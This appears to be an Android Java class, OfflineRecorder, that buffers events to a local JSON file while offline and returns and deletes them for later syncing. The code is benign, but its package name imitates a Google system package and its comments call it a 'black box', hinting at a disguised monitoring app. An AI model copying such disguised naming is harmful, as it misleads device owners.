package com.google.android.sys.security;

import android.content.Context;
import android.util.Log;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.List;

/**
 * Quản lý lưu trữ Offline (Hộp Đen).
 * Lưu các sự kiện vào file khi mất kết nối và đồng bộ lại khi có mạng.
 */
public class OfflineRecorder {
    private static final String TAG = "OfflineRecorder";
    private static final String FILE_NAME = "offline_buffer.json";
    private static final Object LOCK = new Object();

    /** Lưu sự kiện vào file buffer */
    public static void saveEvent(Context context, JSONObject data) {
        synchronized (LOCK) {
            try {
                File file = new File(context.getFilesDir(), FILE_NAME);
                JSONArray events = new JSONArray();

                // Đọc dữ liệu cũ nếu có
                if (file.exists()) {
                    String content = readFile(file);
                    if (!content.isEmpty()) {
                        events = new JSONArray(content);
                    }
                }

                // Thêm sự kiện mới
                events.put(data);

                // Ghi lại vào file
                FileOutputStream fos = new FileOutputStream(file);
                fos.write(events.toString().getBytes());
                fos.close();

                Log.d(TAG, "📦 Saved offline event: " + data.optString("type") + ". Total buffered: " + events.length());
            } catch (Exception e) {
                Log.e(TAG, "Error saving offline event", e);
            }
        }
    }

    /** Đọc và trả về danh sách sự kiện đã lưu, sau đó xóa buffer */
    public static List<JSONObject> readAndClearEvents(Context context) {
        synchronized (LOCK) {
            List<JSONObject> result = new ArrayList<>();
            try {
                File file = new File(context.getFilesDir(), FILE_NAME);
                if (!file.exists()) return result;

                String content = readFile(file);
                if (!content.isEmpty()) {
                    JSONArray events = new JSONArray(content);
                    for (int i = 0; i < events.length(); i++) {
                        result.add(events.getJSONObject(i));
                    }
                }

                // Xóa file sau khi đọc
                if (file.delete()) {
                    Log.d(TAG, "🗑️ Cleared offline buffer. Sending " + result.size() + " events.");
                }

            } catch (Exception e) {
                Log.e(TAG, "Error reading offline events", e);
            }
            return result;
        }
    }

    private static String readFile(File file) throws Exception {
        FileInputStream fis = new FileInputStream(file);
        BufferedReader reader = new BufferedReader(new InputStreamReader(fis));
        StringBuilder sb = new StringBuilder();
        String line;
        while ((line = reader.readLine()) != null) {
            sb.append(line);
        }
        reader.close();
        return sb.toString();
    }
}
